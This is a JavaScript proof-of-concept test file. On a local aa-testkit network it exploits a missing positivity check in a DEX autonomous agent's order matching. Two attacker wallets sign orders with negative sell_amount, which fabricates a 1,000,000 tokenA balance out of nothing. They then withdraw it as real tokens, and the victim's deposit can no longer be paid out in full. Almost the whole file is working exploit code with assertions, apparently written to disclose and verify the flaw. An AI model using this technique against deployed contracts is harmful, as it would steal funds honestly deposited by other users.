// uses `aa-testkit` testing framework for AA tests. Docs can be found here `https://github.com/valyakin/aa-testkit`
// `mocha` standard functions and `expect` from `chai` are available globally
// `Testkit`, `Network`, `Nodes` and `Utils` from `aa-testkit` are available globally too

// PoC: dex.oscript's order-matching case never checks that sell_amount/price are positive.
// Two colluding addresses can submit orders with negative sell_amount directly to the AA
// (bypassing the off-chain matcher backend, which is the only place that validates this),
// fabricate an asset balance out of thin air, and withdraw it as real tokens - draining
// funds that were honestly deposited by other users.

const path = require('path')

describe('Negative order amount lets attackers fabricate balances and drain the DEX', function () {
	this.timeout(240000)

	before(async () => {
		this.network = await Network.create()
			.with.agent({ dex: path.join(__dirname, '../dex-old.oscript') })
			.with.asset({ tokenA: {} })
			.with.wallet({ victim: { base: 1e9, tokenA: 5000000 } })
			.with.wallet({ attacker1: { base: 1e7 } })
			.with.wallet({ attacker2: { base: 1e7 } })
			.with.wallet({ attacker3: { base: 1e7 } })
			.with.wallet({ attacker4: { base: 1e7 } })
			.with.wallet({ matcher2: { base: 1e7 } })
			.run()

		this.dexAa = this.network.agent.dex
		this.tokenA = this.network.asset.tokenA

		this.victim = this.network.wallet.victim
		this.victimAddress = await this.victim.getAddress()

		this.attacker1 = this.network.wallet.attacker1
		this.attacker1Address = await this.attacker1.getAddress()

		this.attacker2 = this.network.wallet.attacker2
		this.attacker2Address = await this.attacker2.getAddress()

		this.attacker3 = this.network.wallet.attacker3
		this.attacker3Address = await this.attacker3.getAddress()

		this.attacker4 = this.network.wallet.attacker4
		this.attacker4Address = await this.attacker4.getAddress()

		this.matcher2 = this.network.wallet.matcher2
		this.matcher2Address = await this.matcher2.getAddress()
	})

	it('Victim deposits real tokenA into the DEX', async () => {
		const { unit, error } = await this.victim.sendMulti({
			asset: this.tokenA,
			asset_outputs: [{ address: this.dexAa, amount: 2000000 }],
			base_outputs: [{ address: this.dexAa, amount: 10000 }],
			change_address: this.victimAddress,
		})
		expect(error).to.be.null
		expect(unit).to.be.validUnit

		const { response } = await this.network.getAaResponseToUnit(unit)
		expect(response.response.error).to.be.undefined
		expect(response.bounced).to.be.false
		await this.network.witnessUntilStable(unit)

		const { vars } = await this.victim.readAAStateVars(this.dexAa)
		expect(vars['balance_' + this.victimAddress + '_' + this.tokenA]).to.equal(2000000)
	})

	it('Attackers pre-fund their accounts with a bit of base to cover AA fees', async () => {
		for (const attacker of [this.attacker1, this.attacker2]) {
			const { unit, error } = await attacker.sendBytes({ toAddress: this.dexAa, amount: 20000 })
			expect(error).to.be.null
			const { response } = await this.network.getAaResponseToUnit(unit)
			expect(response.bounced).to.be.false
			await this.network.witnessUntilStable(unit)
		}
	})

	it('Attackers match two orders with negative sell_amount to fabricate a tokenA balance out of thin air', async () => {
		const order1 = {
			address: this.attacker1Address,
			sell_asset: this.tokenA,
			buy_asset: 'FAKE_TOKEN_B_NOT_A_REAL_ASSET',
			sell_amount: -1000000, // negative amount: never validated by the AA itself
			price: 1,
			matcher: this.attacker1Address,
			aa: this.dexAa,
			matcher_fee: 0,
			matcher_fee_asset: 'base',
		}
		const order2 = {
			address: this.attacker2Address,
			sell_asset: 'FAKE_TOKEN_B_NOT_A_REAL_ASSET',
			buy_asset: this.tokenA,
			sell_amount: -1000000, // negative on the other leg too, so both balance checks pass trivially
			price: 1,
			matcher: this.attacker1Address,
			aa: this.dexAa,
			matcher_fee: 0,
			matcher_fee_asset: 'base',
		}

		const { signedPackage: signedOrder1 } = await this.attacker1.signMessage(order1)
		const { signedPackage: signedOrder2 } = await this.attacker2.signMessage(order2)

		const { unit, error } = await this.attacker1.triggerAaWithData({
			toAddress: this.dexAa,
			amount: 10000,
			data: { order1: signedOrder1, order2: signedOrder2 },
		})
		expect(error).to.be.null
		expect(unit).to.be.validUnit

		const { response } = await this.network.getAaResponseToUnit(unit)
		console.log(response.response.error)
		expect(response.response.error).to.be.undefined
		expect(response.bounced).to.be.false
		expect(response.response.responseVars.event).to.equal('trade')
		await this.network.witnessUntilStable(unit)

		const { vars } = await this.attacker1.readAAStateVars(this.dexAa)
		// attacker1 never deposited any tokenA, yet now "owns" 1,000,000 of it
		expect(vars['balance_' + this.attacker1Address + '_' + this.tokenA]).to.equal(1000000)
	})

	it('Attacker withdraws the fabricated tokenA as real tokens', async () => {
		const { unit, error } = await this.attacker1.triggerAaWithData({
			toAddress: this.dexAa,
			amount: 10000,
			data: { withdraw: true, asset: this.tokenA, amount: 1000000 },
		})
		expect(error).to.be.null
		expect(unit).to.be.validUnit

		const { response } = await this.network.getAaResponseToUnit(unit)
		expect(response.response.error).to.be.undefined
		expect(response.bounced).to.be.false

		const paymentMessage = response.objResponseUnit.messages.find(m => m.app === 'payment' && m.payload.asset === this.tokenA)
		expect(paymentMessage).to.not.be.undefined
		expect(paymentMessage.payload.outputs.some(o => o.address === this.attacker1Address && o.amount === 1000000)).to.be.true

		await this.network.witnessUntilStable(unit)
	})

	it('Victim can no longer withdraw their full legitimate deposit: the DEX is insolvent', async () => {
		const { vars } = await this.victim.readAAStateVars(this.dexAa)
		// victim's own tracked entitlement is untouched by the attack...
		expect(vars['balance_' + this.victimAddress + '_' + this.tokenA]).to.equal(2000000)

		// ...but the AA no longer actually holds that much tokenA - 1,000,000 of it was drained
		const { unit, error } = await this.victim.triggerAaWithData({
			toAddress: this.dexAa,
			amount: 10000,
			data: { withdraw: true, asset: this.tokenA, amount: 2000000 },
		})
		expect(error).to.be.null
		expect(unit).to.be.validUnit

		const { response } = await this.network.getAaResponseToUnit(unit)
		expect(response.bounced).to.be.true
	})

	it('The same trick fails when base itself is one of the traded assets', async () => {
		// give both a small legit base balance, nowhere near enough to survive a -1,000,000 debit
		for (const attacker of [this.attacker3, this.attacker4]) {
			const { unit } = await attacker.sendBytes({ toAddress: this.dexAa, amount: 20000 })
			const { response } = await this.network.getAaResponseToUnit(unit)
			expect(response.bounced).to.be.false
			await this.network.witnessUntilStable(unit)
		}

		const order1 = { // attacker3 tries to fabricate base by "selling" it at a negative amount
			address: this.attacker3Address,
			sell_asset: 'base',
			buy_asset: 'FAKE_TOKEN_C_NOT_A_REAL_ASSET',
			sell_amount: -1000000,
			price: 1,
			matcher: this.matcher2Address,
			aa: this.dexAa,
			matcher_fee: 0,
			matcher_fee_asset: 'base',
		}
		const order2 = { // attacker4 is forced to be the counterparty "buying" base
			address: this.attacker4Address,
			sell_asset: 'FAKE_TOKEN_C_NOT_A_REAL_ASSET',
			buy_asset: 'base',
			sell_amount: -1000000,
			price: 1,
			matcher: this.matcher2Address,
			aa: this.dexAa,
			matcher_fee: 0,
			matcher_fee_asset: 'FAKE_TOKEN_C_NOT_A_REAL_ASSET', // avoid the matcher-fee check catching this before the AA-fee check does
		}

		const { signedPackage: signedOrder1 } = await this.attacker3.signMessage(order1)
		const { signedPackage: signedOrder2 } = await this.attacker4.signMessage(order2)

		const { unit, error } = await this.matcher2.triggerAaWithData({
			toAddress: this.dexAa,
			amount: 10000,
			data: { order1: signedOrder1, order2: signedOrder2 },
		})
		expect(error).to.be.null

		const { response } = await this.network.getAaResponseToUnit(unit)
		// attacker4's own base_key doubles as the AA-fee balance check, which catches the fabricated debit
		expect(response.bounced).to.be.true
		expect(response.response.error.message).to.equal('not enough balance for AA fees')
	})

	after(async () => {
		await this.network.stop()
	})
})
